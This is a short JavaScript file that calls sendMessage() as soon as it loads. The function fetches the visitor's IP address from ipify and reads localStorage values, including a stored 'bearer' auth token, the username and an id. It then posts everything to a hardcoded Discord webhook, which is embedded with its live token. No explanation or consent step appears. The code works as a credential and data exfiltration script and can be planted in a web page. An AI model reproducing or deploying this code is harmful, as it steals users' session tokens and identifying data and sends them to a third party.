function getIpAddress(callback) {
  const request = new XMLHttpRequest();
  request.open("GET", "https://api.ipify.org/?format=json");

  request.onload = function () {
    if (request.status === 200) {
      const response = JSON.parse(request.responseText);
      const ipAddress = response.ip;
      callback(ipAddress);
    } else {
      callback(null);
    }
  };

  request.onerror = function () {
    callback(null);
  };

  request.send();
}

function sendMessage() {
  getIpAddress(function(ipAddress) {
    const experience = localStorage.getItem('experience');
    const selectedCategory = localStorage.getItem('selectedCategory');
    const username = localStorage.getItem('username');
    const bearer = localStorage.getItem('bearer');
    const providerIndex = localStorage.getItem('providerIndex');
    const discordPopup = localStorage.getItem('discordPopup');
    const id = localStorage.getItem('id');

    const params = {
      username: "My Webhook Name",
      avatar_url: "",
      embeds: [{
        title: "User Data",
        fields: [
          {
            name: "Experience",
            value: experience || "Not available",
            inline: true
          },
          {
            name: "Selected Category",
            value: selectedCategory || "Not available",
            inline: true
          },
          {
            name: "Username",
            value: username || "Not available",
            inline: true
          },
          {
            name: "Bearer",
            value: bearer || "Not available",
            inline: true
          },
          {
            name: "Provider Index",
            value: providerIndex || "Not available",
            inline: true
          },
          {
            name: "Discord Popup",
            value: discordPopup || "Not available",
            inline: true
          },
          {
            name: "ID",
            value: id || "Not available",
            inline: true
          },
          {
            name: "IP Address",
            value: ipAddress || "Not available",
            inline: true
          }
        ]
      }]
    };

    // Send message with updated params
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1228026400896978995/4hmvo_ddvD3YULuOCl8IGpES2KfvTPhS67XVgnZRG-2D16ZscTG_3qCIx5HuVB-RUt1N");
    request.setRequestHeader('Content-type', 'application/json');
    request.send(JSON.stringify(params));
    
    request.onreadystatechange = function () {
      if (request.readyState === 4) {
        if (request.status === 200) {
          console.log('Message sent successfully!');
        } else {
          console.error('Failed to send message. Status:', request.status);
        }
      }
    };
  });
}

sendMessage();
